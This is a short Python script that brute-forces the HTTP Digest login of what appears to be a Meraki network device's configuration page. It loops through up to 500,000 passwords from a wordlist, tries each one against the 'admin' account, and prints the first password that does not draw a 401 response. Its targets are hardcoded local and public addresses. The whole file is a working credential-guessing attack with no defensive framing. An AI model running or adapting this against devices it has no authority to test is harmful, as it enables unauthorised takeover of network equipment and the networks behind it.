import requests
from requests.auth import HTTPDigestAuth

passwordcounter = 0

testurl = 'https://www.google.com'
url1 = 'http://172.16.1.1/configure'
url2 = 'http://setup.meraki.com/configure'
url3 = 'http://138.207.175.210/configure'
url4 = 'http://172.16.1.1/configure/index.cgi'

total = 500000

with open('pwd.txt') as file:
    passwords = [line.rstrip() for line in file]


for i in range(len(passwords)-total, len(passwords)):
    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i]))
    if request.status_code != 401:
        print(f'\n\nSuccess! Password is \"{passwords[i]} and counter is {i}. Status code was {request.status_code}\"')
        break
    if i % 100 == 0:
        print(f'{i}, ', end='')


# r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
# print(r.status_code)

